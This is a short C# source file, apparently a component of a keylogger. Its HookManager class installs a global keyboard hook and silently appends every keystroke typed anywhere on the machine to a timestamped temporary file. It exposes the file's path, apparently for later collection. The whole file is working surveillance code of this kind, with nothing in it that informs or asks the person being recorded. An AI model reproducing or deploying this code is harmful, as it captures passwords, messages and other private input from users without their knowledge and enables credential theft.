using System;
using System.IO;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;

namespace ComeBackLuci
{
    public class HookManager : IDisposable
    {
        private IKeyboardMouseEvents M_GlobalHook;
        private string _fileData;

        public HookManager()
        {
            this._fileData = Path.GetTempFileName();
        }

        public string GetHookFile()
        {
            return _fileData;
        }

        public void Subscribe()
        {
            if (M_GlobalHook != null) return;

            File.WriteAllText(_fileData, $"----- {DateTime.Now.ToString("dd/MM/yyyy - hh:mm tt")} -----\n\n");

            M_GlobalHook = Hook.GlobalEvents();
            M_GlobalHook.KeyPress += GlobalHookKeyPress;
        }

        private void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            using (StreamWriter sw = new StreamWriter(_fileData, true))
            {
                sw.Write(e.KeyChar);
            }
        }

        public void Dispose()
        {
            if (M_GlobalHook != null)
            {
                M_GlobalHook.KeyPress -= GlobalHookKeyPress;
                M_GlobalHook.Dispose();
            }
        }
    }
}